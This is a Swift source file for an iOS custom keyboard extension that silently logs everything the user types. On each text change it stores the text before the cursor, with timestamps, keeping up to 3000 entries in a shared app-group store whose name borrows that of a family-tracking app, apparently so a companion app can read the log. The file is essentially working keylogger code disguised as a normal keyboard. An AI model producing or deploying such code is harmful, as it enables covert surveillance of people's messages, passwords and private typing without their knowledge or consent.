import UIKit

final class KeyboardViewController: UIInputViewController {
    private let store = UserDefaults(suiteName: "group.com.you.life360")

    override func viewDidLoad() {
        super.viewDidLoad()
        store?.set(Date().timeIntervalSince1970, forKey: "kb_seen")
    }

    override func textDidChange(_ textInput: UITextInput?) {
        guard let text = textDocumentProxy.documentContextBeforeInput, !text.isEmpty else { return }
        var log = store?.stringArray(forKey: "log") ?? []
        if log.last?.hasSuffix("|\(text)") == true { return }
        log.append("\(Date().timeIntervalSince1970)|\(text)")
        if log.count > 3000 { log.removeFirst(log.count - 3000) }
        store?.set(log, forKey: "log")
    }
}
